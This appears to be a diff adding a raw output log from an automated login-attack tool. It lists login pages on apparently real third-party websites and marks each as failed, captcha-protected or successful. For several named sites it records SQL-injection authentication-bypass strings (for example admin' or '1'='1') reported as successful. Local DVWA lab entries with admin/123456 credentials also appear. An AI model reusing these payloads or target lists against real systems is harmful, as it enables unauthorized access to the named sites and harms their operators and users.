@@ -1,0 +1,27 @@
+[-] Mayme not login pages:http://cj.ctps.cn:80/user_login.asp
+[-]验证码 in login page: http://www.sdass.net.cn/admin/
+[-] Faild url:https://login.jj.cn/user/login.php
+[-] Faild url:http://www.lypyxx.com/phpmyadmin/index.php
+[-] Faild url:http://www.aisixiang.com/member/login.php
+[-]验证码 in login page: http://ggys.lsgx.com.cn/e/master/login.aspx
+[-]验证码 in login page: http://ggys.lsgx.com.cn/e/member/index.aspx?s=1&type=login
+[-] Faild url:http://www.302hospital.com/SysmanageAdmin/login.php
+[+] Success url:http://www.piaoliuhk.com/login.php          admin' or '1'='1' or 1=1/admin' or 'a'='a
+[-] Faild url:http://www.igo.cn/php/login.php
+[-] Faild url:http://cache1.cheping.com.cn:80/login.php
+[-] Faild url:http://bm.xmstm.com.cn/login.asp
+[-] Mayme not login pages:http://blog.rayli.com.cn:80/
+[+] Success url:http://data.chinajci.com:80/          admin' or 'a'='a/'or'='or'
+[-] Faild url:http://coloros.wjx.cn:80/
+[-] Faild url:http://crm.915hr.com:80/
+[+] Success url:http://data.chinajci.com:80/login.asp          admin' or 'a'='a/'or'='or'
+[-] Mayme not login pages:http://cj.ctps.cn/default.asp
+[-] Faild url:http://127.0.0.1/DVWA/login.php
+[-] Faild url:http://127.0.0.1/DVWA/vulnerabilities/brute/
+[-] Faild url:http://127.0.0.1/lg/login.html
+[-] Faild url:http://127.0.0.1/lg/login.html
+[+] Success url:http://127.0.0.1/lg/login.html          admin/123456
+[+] Success url:http://127.0.0.1/lg/login.html          admin/123456
+[+] Success url:http://127.0.0.1/lg/login.html          admin/123456
+[-] Faild url:http://127.0.0.1/lg/login.html
+[-] Faild url:http://127.0.0.1/DVWA/
